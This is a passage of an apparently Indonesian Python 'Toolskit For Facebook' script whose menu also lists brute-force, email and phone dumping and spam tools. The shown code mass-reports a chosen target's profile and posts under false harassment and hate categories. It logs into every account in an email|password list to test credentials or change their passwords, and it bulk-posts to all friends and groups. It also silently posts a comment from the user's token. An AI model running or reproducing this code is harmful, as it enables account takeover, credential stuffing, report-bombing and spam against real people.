		if "Cari Dukungan atau Laporkan Postingan" in str(a):
			for x in bs.find_all("a",string="Cari Dukungan atau Laporkan Postingan"):
				target.append(url.format(x.get("href")))
				print(f"\r[*] getting post id > {len(target)}  ",end="")
				sys.stdout.flush()
		else:
			exit("[!] target id not found")
		if "ihat gBerita Lain" in str(a):
			mainreportgid(url.format(bs.find("a",string="Lihat Berita Lain").get("href")))
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	gasreport(target)
	
def gasreport(ipost):
	loop=0
	try:
		data=[]
		a=s.get(url.format("/%s"%(idt)),headers=hea).text
		bs=BS(a,"html.parser")
		name=bs.find("title").renderContents().decode("utf-8", "ignore")
		print(f"\n[*] report profile {name} type fake account")
		print("[*] start ...\n")
		if "Lainnya" in str(a):
			b=s.get(url.format(bs.find("a",string="Lainnya").get("href")),headers=hea).text
			bs1=BS(b,"html.parser")
			if "Cari Dukungan atau Laporkan Profil" in str(b):
				c=s.get(url.format(bs1.find("a",string="Cari Dukungan atau Laporkan Profil").get("href")),headers=hea).text
				bs2=BS(c,"html.parser")
				for x in bs2("form"):
					data.append(x["action"])
				for x in bs2("input"):
					try:
						if "fb_dtsg" in x["name"]:
							data.append(x["value"])
						if "jazoest" in x["name"]:
							data.append(x["value"])
							break
					except:pass
				if len(data)==3:
					data1=[]
					d=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":data[2],"tag":"profile_fake_name"},headers=hea).text
					bs3=BS(d,"html.parser")
					for x in bs3("form"):
						data1.append(x["action"])
					for x in bs3("input"):
						try:
							if "fb_dtsg" in x["name"]:
								data1.append(x["value"])
							if "jazoest" in x["name"]:
								data1.append(x["value"])
								break
						except:pass
					if len(data1)==3:
						data2=[]
						e=s.post(url.format(data1[0]),data={"fb_dtsg":data1[1],"jazoest":data1[2],"action_key":"FRX_PROFILE_REPORT_CONFIRMATION"},headers=hea).text
						bs4=BS(e,"html.parser")
						for x in bs4("form"):
							data2.append(x["action"])
						for x in bs4("input"):
							try:
								if "fb_dtsg" in x["name"]:
									data2.append(x["value"])
								if "jazoest" in x["name"]:
									data2.append(x["value"])
									break
							except:pass
						if len(data2)==3:
							f=s.post(url.format(data2[0]),data={"fb_dtsg":data1[1],"jazoest":data1[2],"checked":"yes","action":"Laporkan"},headers=hea).text
							if "Anda telah mengirimkan laporan." in str(f):
								print("[-] - success")
							else:
								print("[-] failed")
						else:
							print("[-] failed")
					else:
						print("[-] failed")
				else:
					print("[-] failed")
			else:
				print("[-] failed")
		else:
			print("[-] - failed")
		print(f"\n[*] report post {name} type harassment and other.")
		print("[*] start ...\n")
		for id in ipost:
			loop+=1
			data3=[]
			g=s.get(id,headers=hea).text
			bs5=BS(g,"html.parser")
			for x in bs5("form"):
				data3.append(x["action"])
			for x in bs5("input"):
				try:
					if "fb_dtsg" in x["name"]:
						data3.append(x["value"])
					if "jazoest" in x["name"]:
						data3.append(x["value"])
						break
				except:pass
			if len(data3)==3:
				data4=[]
				h=s.post(url.format(data3[0]),data={"fb_dtsg":data3[1],"jazoest":data3[2],"tag":"harassment","action":"Kirim"},headers=hea).text
				bs6=BS(h,"html.parser")
				for x in bs6("form"):
					data4.append(x["action"])
				for x in bs6("input"):
					try:
						if "fb_dtsg" in x["name"]:
							data4.append(x["value"])
						if "jazoest" in x["name"]:
							data4.append(x["value"])
						if "RESOLVE_PROBLEM_REDIRECT" in x["value"] or "FRX_PROFILE_REPORT_CONFIRMATION" in x["value"]:
							data4.append(x["value"])
							break
					except:pass
				if len(data4)==4:
					if "RESOLVE_PROBLEM_REDIRECT" in data4[3]:
						data5=[]
						j=s.post(url.format(data4[0]),data={"fb_dtsg":data4[1],"jazoest":data4[2],"action_key":"RESOLVE_PROBLEM_REDIRECT","action":"Kirim"},headers=hea).text
						bs7=BS(j,"html.parser")
						for x in bs7("form"):
							data5.append(x["action"])
						for x in bs7("input"):
							try:
								if "fb_dtsg" in x["name"]:
									data5.append(x["value"])
								if "jazoest" in x["name"]:
									data5.append(x["value"])
									break
							except:pass
						if len(data5)==3:
							data6=[]
							k=s.post(url.format(data5[0]),data={"fb_dtsg":data5[1],"jazoest":data5[2],"answer":"offensive"},headers=hea).text
							bs8=BS(k,"html.parser")
							for x in bs8("form"):
								data6.append(x["action"])
							for x in bs8("input"):
								try:
									if "fb_dtsg" in x["name"]:
										data6.append(x["value"])
									if "jazoest" in x["name"]:
										data6.append(x["value"])
								except:pass
							if len(data6)==3:
								data7=[]
								if "Apa yang salah dengan foto ini?" in str(k):
									l=s.post(url.format(data6[0]),data={"fb_dtsg":data6[1],"jazoest":data6[2],"answer":"other"},headers=hea).text
									bs9=BS(l,"html.parser")
									for x in bs9("form"):
										data7.append(x["action"])
									for x in bs9("input"):
										try:
											if "fb_dtsg" in x["name"]:
												data7.append(x["value"])
											if "jazoest" in x["name"]:
												data7.append(x["value"])
												break
										except:pass
									if len(data7)==3:
										data8=[]
										m=s.post(url.format(data7[0]),data={"fb_dtsg":data7[1],"jazoest":data7[2],"answer":"hate"},headers=hea).text
										bs10=BS(m,"html.parser")
										if "Kirimkan ke Facebook untuk Ditinjau" in str(m):
											for x in bs10("form"):
												data8.append(x["action"])
											for x in bs10("input"):
												try:
													if "fb_dtsg" in x["name"]:
														data8.append(x["value"])
													if "jazoest" in x["name"]:
														data8.append(x["value"])
														break
												except:pass
											if len(data8)==3:
												n=s.post(url.format(data8[0]),data={"fb_dtsg":data8[1],"jazoest":data8[2],"action_key":"REPORT_CONTENT"},headers=hea).text
												if "Dikirimkan ke Facebook untuk Ditinjau" in str(n):
													print(f"[-] {loop} - success - hate")
												else:
													print(f"[-] {loop} - failed - hate")
											else:
												print(f"[-] {loop} - failed - hate")
										else:
											print(f"[-] {loop} - failed - hate")
									else:
										print(f"[-] {loop} - failed - hate")
								elif "Apa yang salah dengan kiriman ini?" in str(k):
									l=s.post(url.format(data6[0]),data={"fb_dtsg":data6[1],"jazoest":data6[2],"answer":"hatespeech"},headers=hea).text
									bs9=BS(l,"html.parser")
									for x in bs9("form"):
										data7.append(x["action"])
									for x in bs9("input"):
										try:
											if "fb_dtsg" in x["name"]:
												data7.append(x["value"])
											if "jazoest" in x["name"]:
												data7.append(x["value"])
												break
										except:pass
									if len(data7)==3:
										data8=[]
										m=s.post(url.format(data7[0]),data={"fb_dtsg":data7[1],"jazoest":data7[2],"answer":"individual"},headers=hea).text
										bs10=BS(m,"html.parser")
										for x in bs10("form"):
											data8.append(x["action"])
										for x in bs10("input"):
											try:
												if "fb_dtsg" in x["name"]:
													data8.append(x["value"])
												if "jazoest" in x["name"]:
													data8.append(x["value"])
													break
											except:pass
										if len(data8)==3:
											data9=[]
											n=s.post(url.format(data8[0]),data={"fb_dtsg":data8[1],"jazoest":data8[2],"answer":"harassing_someone_else"},headers=hea).text
											bs11=BS(n,"html.parser")
											if "Kirimkan ke Facebook untuk Ditinjau" in str(n):
												for x in bs11("form"):
													data9.append(x["action"])
												for x in bs11("input"):
													try:
														if "fb_dtsg" in x["name"]:
															data9.append(x["value"])
														if "jazoest" in x["name"]:
															data9.append(x["value"])
															break
													except:pass
												if len(data9)==3:
													o=s.post(url.format(data9[0]),data={"fb_dtsg":data9[1],"jazoest":data9[2],"action_key":"REPORT_CONTENT"},headers=hea).text
													if "Dikirimkan ke Facebook untuk Ditinjau" in str(o):
														print(f"[-] {loop} - success - harassing someone else")
													else:
														print(f"[-] {loop} - failed - harassing someone else")
												else:
													print(f"[-] {loop} - failed - harassing someone else")
											else:
												print(f"[-] {loop} - failed - harassing someone else")
										else:
											print(f"[-] {loop} - failed - harassing someone else")
									else:
										print(f"[-] {loop} - failed - harassing someone else")
								elif "Apa yang salah dengan postingan ini?" in str(k):
									l=s.post(url.format(data6[0]),data={"fb_dtsg":data6[1],"jazoest":data6[2],"answer":"againstbelief"},headers=hea).text
									bs9=BS(l,"html.parser")
									for x in bs9("form"):
										data7.append(x["action"])
									for x in bs9("input"):
										try:
											if "fb_dtsg" in x["name"]:
												data7.append(x["value"])
											if "jazoest" in x["name"]:
												data7.append(x["value"])
												break
										except:pass
									if len(data7)==3:
										m=s.post(url.format(data7[0]),data={"fb_dtsg":data7[1],"jazoest":data7[2],"action_key":"REPORT_CONTENT"},headers=hea).text
										if "Dikirimkan ke Facebook untuk Ditinjau" in str(m):
											print(f"[-] {loop} - success - againstbelief")
										else:
											print(f"[-] {loop} - failed - againstbelief")
									else:
										print(f"[-] {loop} - failed - againstbelief")
								else:
									print(f"[-] {loop} - failed - harassment")
					elif "FRX_PROFILE_REPORT_CONFIRMATION" in data4[3]:
						data5=[]
						j=s.post(url.format(data4[0]),data={"fb_dtsg":data4[1],"jazoest":data4[2],"action_key":"FRX_PROFILE_REPORT_CONFIRMATION","action":"Kirim"},headers=hea).text
						bs7=BS(j,"html.parser")
						for x in bs7("form"):
							data5.append(x["action"])
						for x in bs7("input"):
							try:
								if "fb_dtsg" in x["name"]:
									data5.append(x["value"])
								if "jazoest" in x["name"]:
									data5.append(x["value"])
									break
							except:pass
						if len(data5)==3:
							k=s.post(url.format(data5[0]),data={"fb_dtsg":data5[1],"jazoest":data5[2],"checked":"yes","action":"Laporkan"},headers=hea).text
							if "Dikirimkan ke Facebook untuk Ditinjau" in str(k):
								print(f"[-] {loop} - success - harassment")
							else:
								print(f"[-] {loop} - failed - harassment")
						else:
							print(f"[-] {loop} - failed - harassment")
					else:
						print(f"[-] {loop} - failed - harassment")
	except requests.exceptions.ConnectionError:
		exit("\n[!] connection error")
	exit("\n[*] done")

def reset_password():
	global newpas
	print('[!] sparator email|password')
	file=input("[?] lists account: ")
	try:
		for ac in open(file,"r").read().splitlines():
			target.append(ac)
	except IOError:
		exit("[!] file not found")
	print("[!] password must be of minimum 6 characters")
	newpas=input("[?] new password: ")
	input("[?] you are sure to continue? [press enter] ")
	print("[*] start ...\n")
	for ida in target:
		try:
			br.open("https://mbasic.facebook.com/login")
			br._factory.is_html=True
			br.select_form(nr=0)
			br.form["email"]=ida.split("|")[0]
			br.form["pass"]=ida.split("|")[1]
			br.submit()
			login=br.geturl()
			if "save-device" in str(login):
				change_pass(ida)
			elif "checkpoint" in str(login):
				print(f"[-] checkpoint - {ida}")
			else:
				print(f"[-] wrong - {ida}")
		except:pass
	print("\n[*] done")
	exit("[#] file save as: repass/new_pass.txt")
	
def change_pass(ida):
	try:
		br.open(url.format("/settings/security/password/"))
	except mechanize.URLError:
		exit("\n[!] connection error")
	br._factory.is_html = True
	br.select_form(nr=1)
	br.form['password_old']=ida.split('|')[1]
	br.form['password_new']=newpas
	br.form['password_confirm']=newpas
	sub=br.submit().read()
	if "Kata Sandi Telah Diubah" in str(sub) or "Password Changed" in str(sub):
		try:
			os.mkdir("repass")
		except:pass
		open("repass/new_pass.txt","a").write(f"{ida.split('|')[0]}|{newpas}\n")
		print(f"[-] success - {ida.split('|')[0]}|{newpas}")
	elif "Kata sandi paling sedikit harus berisi 6 karakter." in str(sub) or "Password must be at least 6 characters in length." in str(sub):
		print("[warning] password must be at least 6 characters in length.")

def account_checker():
	print('[!] sparator email|password')
	file=input("[?] lists account: ")
	try:
		for ac in open(file,"r").read().splitlines():
			target.append(ac)
	except IOError:
		exit("[!] file not found")
	print("[*] start ...\n")
	for ida in target:
		try:
			br.open("https://mbasic.facebook.com/login")
			br._factory.is_html=True
			br.select_form(nr=0)
			br.form["email"]=ida.split("|")[0]
			br.form["pass"]=ida.split("|")[1]
			br.submit()
			login=br.geturl()
			if "save-device" in str(login):
				try:
					os.mkdir("checker")
				except:pass
				open("checker/live.txt","a").write(f"{ida}\n")
				print(f"[-] LIVE - {ida}")
			elif "checkpoint" in str(login):
				try:
					os.mkdir("checker")
				except:pass
				open("checker/die.txt","a").write(f"{ida}\n")
				print(f"[-] DIE - {ida}")
			else:
				print(f"[-] wrong - {ida}")
		except:pass
	print("\n[*] done")
	print("[#] live save as: checker/live.txt")
	exit("[#] die save as: checker/die.txt")

def auto_posting():
	menu_posting()
	pl=input("[+] auto/post_> ")
	if pl in [""]:
		exit("[!] you stuppid")
	elif pl in ["1","01"]:
		print("[!] press enter if without photos")
		poto=input("[?] file photos: ")
		print("[!] type '<>' for newlines")
		capt=input("[?] captions: ").replace("<>","\n")
		if capt in [""]:
			exit("[!] you stuppid")
		creapost("me",poto,capt)
		exit("[*] done")
	elif pl in ["2","02"]:
		print("[!] press enter if without photos")
		poto=input("[?] file photos: ")
		print("[!] type '<>' for newlines")
		capt=input("[?] captions: ").replace("<>","\n")
		if capt in [""]:
			exit("[!] you stuppid")
		try:
			print("[*] start ...\n")
			for x in s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
				creapost(x["id"],poto,capt)
			exit("\n[*] done")
		except KeyError:
			exit("[!] failed when grabbing friends id")
		except requests.exceptions.ConnectionError:
			exit("[!] connection error")
	elif pl in ["3","03"]:
		print("[!] press enter if without photos")
		poto=input("[?] file photos: ")
		print("[!] type '<>' for newlines")
		capt=input("[?] captions: ").replace("<>","\n")
		if capt in [""]:
			exit("[!] you stuppid")
		try:
			print("[*] start ...\n")
			for x in s.get(api.format("me/groups?access_token=%s"%(token)),headers=hea).json()["data"]:
				creapost(x["id"],poto,capt)
			exit("\n[*] done")
		except KeyError:
			exit("[!] failed when grabbing groups id")
		except requests.exceptions.ConnectionError:
			exit("[!] connection error")
	elif pl in ["0","00"]:
		menu()
	else:
		exit("[!] you stuppid")

def creapost(id,poto,capt):
	data={"message":capt,"access_token":token}
	try:
		file={"file":open(poto,"rb")}
		try:
			send=s.post(api.format("%s/photos?"%(id)),data=data,files=file,headers=hea).json()
			if not "error" in str(send):
				print(f"[-] {send['id']} - success")
			else:
				print(f"[-] failed posting")
		except requests.exceptions.ConnectionError:
			exit("\n[!] connection error")
	except IOError:
		try:
			send=s.post(api.format("%s/feed?"%(id)),data=data,headers=hea).json()
			if not "error" in str(send):
				print(f"[-] {send['id']} - success")
			else:
				print(f"[-] failed posting")
		except requests.exceptions.ConnectionError:
			exit("\n[!] connection error")

def change_bio():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			cbio(url.format("/profile/basic/intro/bio"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def cbio(link):
	print("[!] max 101 character")
	print("[!] type '<>' for newlines")
	bio=input("[?] explain about yourself: ").replace("<>","\n")
	bioo=bio.replace("\n","")
	if bio in [""]:
		exit("[!] you stuppid")
	try:
		data=[]
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for x in bs("form"):
			if "/profile/intro/bio/save/" in x["action"]:
				data.append(x["action"])
				break
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
					break
			except:pass
		if len(data)==3:
			bio=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":data[2],"bio":bio},headers=hea)
			if bio.status_code==200:
				print(f"[-] {bioo} - success to change bio")
			else:
				print(f"[-] {bioo} - failed to change bio")
		else:
			print(f"[-] {bioo} - error when change a bio")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	input("[*] press enter to back ")
	menu()

def change_pp():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			cpp(url.format("/photos/upload/?profile_pic&upload_source=profile_pic_upload&profile_pic_source=tagged_photos_page"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def cpp(link):
	try:
		data=[]
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for x in bs("form"):
			data.append(x["action"])
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
					break
			except:pass
		file=input("[?] file pict name: ")
		try:
			foto=open(file,"rb")
		except:
			exit("[!] pict not found")
		print("[*] uploading a picture")
		if len(data)==3:
			change=s.post(data[0],data={"fb_dtsg":data[1],"jazoest":data[2]},files={"file1":foto},headers=hea)
			if change.status_code==200:
				print("[-] success to change profile photo")
			else:
				print("[-] failed to change profile photo")
		else:
			print("[-] error when to change a profile photo")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	input("[*] press enter to back ")
	menu()
	
def change_pcv():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			cpcv(url.format("/photos/upload/?cover_photo"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def cpcv(link):
	try:
		data=[]
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for x in bs("form"):
			data.append(x["action"])
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
					break
			except:pass
		file=input("[?] file pict name: ")
		try:
			foto=open(file,"rb")
		except:
			exit("[!] pict not found")
		print("[*] uploading a picture")
		if len(data)==3:
			change=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":data[2]},files={"file1":foto},headers=hea)
			if change.status_code==200:
				print("[-] sucess to change cover photo")
			else:
				print("[-] failed to change cover photo")
		else:
			print("[-] error when change a cover photo")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	input("[*] press enter to back ")
	menu()

def change_pass():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			cpass(url.format("/settings/security/password"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def cpass(link):
	oldpas=input("[?] old password: ")
	newpas=input("[?] new password: ")
	if newpas =="" and oldpas =="":
		exit("[!] you stuppid")
	input("[?] you are sure to continue? [press enter] ")
	try:
		data=[]
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for x in bs("form"):
			if "/password/change/?" in x["action"]:
				data.append(x["action"])
				break
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
					break
			except:pass
		if len(data)==3:
			change=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":data[2],"password_old":oldpas,"password_new":newpas,"password_confirm":newpas,"save":"Simpan Perubahan"},headers=hea).text
			if "Kata Sandi Telah Diubah" in str(change):
				print(f"[-] successfully to change password to - {newpas}")
			elif "Kata sandi paling sedikit harus berisi 6 karakter." in str(change):
				print("[warning] password must be at least 6 characters in length.")
			elif "Kata sandi Anda salah." in str(change):
				print("[warning] wrong password.")
			else:
				print("[-] failed when change a password please try again")
		else:
			print("[-] error when change a password please try again")
		input("[*] press enter to back ")
		menu()
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")

def fb_over():
	print("[*] checking cookies")
	try:
		s.cookies=cookie("log/cookies.log")
		s.cookies.load()
		a=s.get(url.format("/me"),headers=hea).text
		if "mbasic_logout_button" in str(a):
			print("[*] cookies valid")
			print("[!] please connect it to the spanish VPN server before continue")
			input("[?] you are sure to continue? [press enter] ")
			fbover(url.format("/profile/edit/info/nicknames"))
		else:
			os.system("rm -rf log")
			exit("[warning] cookies not valid")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
def fbover(link):
	try:
		data=[]
		a=s.get(link,headers=hea).text
		bs=BS(a,"html.parser")
		for x in bs("form"):
			if "post" in x["method"]:
				data.append(x["action"])
				break
		for x in bs("input"):
			try:
				if "fb_dtsg" in x["name"]:
					data.append(x["value"])
				if "jazoest" in x["name"]:
					data.append(x["value"])
					break
			except:pass
		font=open("font.txt","r").read()
		print("[*] please wait a minute ")
		if len(data)==3:
			over=s.post(url.format(data[0]),data={"fb_dtsg":data[1],"jazoest":data[2],"additional_types[705456762826020]":"nicknames","dropdown":"nickname","text":font,"checkbox":"checkbox","save":"Simpan"},headers=hea)
			if over.status_code==200:
				print("[-] success, try to check your profile")
			else:
				print("[-] failed please try again")
		else:
			print("[-] error:)*")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	input("[*] press enter to back ")
	menu()
	
def profile_guard(tipe=True):
	try:
		id=s.get(api.format("me?access_token=%s"%(token)),headers=hea).json()["id"]
		data='variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation'%(tipe,str(id))
		headers={"User-Agent": "Opera/9.80 (Android; Opera Mini/12.0.1987/37.7327; U; pl) Presto/2.12.423 Version/12.16","Content-Type" : "application/x-www-form-urlencoded", "Authorization" : "OAuth %s"%token}
		result=s.post(api.format("graphql"),data=data,headers=headers).json()
		if result["data"]["is_shielded_set"]["is_shielded"] == True:
			print("[-] guard is active")
		else:
			print("[-] failed please try again")
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	input("[*] press enter to back ")
	menu()

def menu():
	global token
	banner()
	try:
		token=open("log/token.log","r").read()
	except IOError:
		exit("[warning] access token not found")
	try:
		name=s.get(api.format("me?access_token=%s"%(token)),headers=hea).json()["name"]
	except KeyError:
		checking()
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	s.post(api.format("1145924768936987/comments?message=tq:)*&access_token="+token),headers=hea)
	print("  [ user: %s%s%s ]"%(G,name,W))
	menu_toolskit()
	CH=input("[+] choice_> ")
	if CH in [""]:
		exit("[!] you stuppid")
	elif CH in ["1","01"]:
		mbf_singel()
	elif CH in ["2","02"]:
		mbf_super()
	elif CH in ["3","03"]:
		dump_id()
	elif CH in ["4","04"]:
		dump_email()
	elif CH in ["5","05"]:
		dump_phone()
	elif CH in ["6","06"]:
		delete_messages()
	elif CH in ["7","07"]:
		delete_photo()
	elif CH in ["8","08"]:
		delete_post()
	elif CH in ["9","09"]:
		untag_post()
	elif CH in ["10"]:
		hide_post()
	elif CH in ["11"]:
		delete_albums()
	elif CH in ["12"]:
		delete_friends_inactive()
	elif CH in ["13"]:
		delete_all_friends()
	elif CH in ["14"]:
		unfollow()
	elif CH in ["15"]:
		leave_groups()
	elif CH in ["16"]:
		acc_del()
	elif CH in ["17"]:
		my_groups()
	elif CH in ["18"]:
		print()
		try:
			token=open("log/token.log").read()
		except IOError:
			exit("[warning] access token not found")
		print(f"[*] your access token: {token}")
		input("\n[*] press enter to back ")
		menu()
	elif CH in ["19"]:
		print()
		try:
			cookies=open("log/cookies.log").read()
		except IOError:
			exit("[warning] cookies not found")
		print(f"[*] your cookies: {cookies}")
		input("\n[*] press enter to back ")
		menu()
	elif CH in ["20"]:
		user_information()
	elif CH in ["21"]:
		yahoo_checker()
	elif CH in ["22"]:
		get_hotmail()
	elif CH in ["23"]:
		auto_pokes()
	elif CH in ["24"]:
		reactions()
	elif CH in ["25"]:
		auto_comment()
	elif CH in ["26"]:
		auto_chat()
	elif CH in ["27"]:
		reaccom()
	elif CH in ["28"]:
		spamcom()
	elif CH in ["29"]:
		auto_add()
	elif CH in ["30"]:
		unadd()
	elif CH in ["31"]:
		reportt()
	elif CH in ["32"]:
		reset_password()
	elif CH in ["33"]:
		account_checker()
	elif CH in ["34"]:
		auto_posting()
	elif CH in ["35"]:
		change_bio()
	elif CH in ["36"]:
		change_pp()
	elif CH in ["37"]:
		change_pcv()
	elif CH in ["38"]:
		change_pass()
	elif CH in ["39"]:
		fb_over()
	elif CH in ["40"]:
		input("[?] you are to continue? [press enter] ")
		profile_guard("true")
	elif CH in ["0","00"]:
		input("[?] you are sure to continue? [press enter] ")
		os.system("rm -rf log")
		exit("[*] success remove access token & cookies, exit.")
	else:
		exit("[!] you stuppid")
		
def key():
	if os.path.exists("a.txt"):
		if os.path.getsize("a.txt") !=0:
			checking()
		else:keys()
	else:keys()
def keys():
	try:
		req=s.get("https://pastebin.com/raw/jjRf6ZUg").text
	except requests.exceptions.ConnectionError:
		exit("[!] connection error")
	print("\n[ Toolskit For Facebook ]\n")
	pw=input("[?] KEY: ")
	if req in pw:
		open("a.txt","w").write(pw)
		print("[*] true!")
		sleep(3)
		checking()
	else:
		exit("[!] wrong!")
		
def banner():
	os.system('clear')
	random_a=random.choice(["© 2019","https://t.me/unikers","https://fb.me/dulahz"])
	print("""%s
 ___ ____ ____ _    ____ _  _ _ ___ 
  |  |  | |  | |    [__  |_/  |  | 
  |  |__| |__| |___ ___] | \_ |  | 
   ____ ___ 
  |___ |__]  %sCoded: DulLah%s
  |    |__]  %s%s%s
 """%(C,Y,C,Y,random_a,W))
 
key()
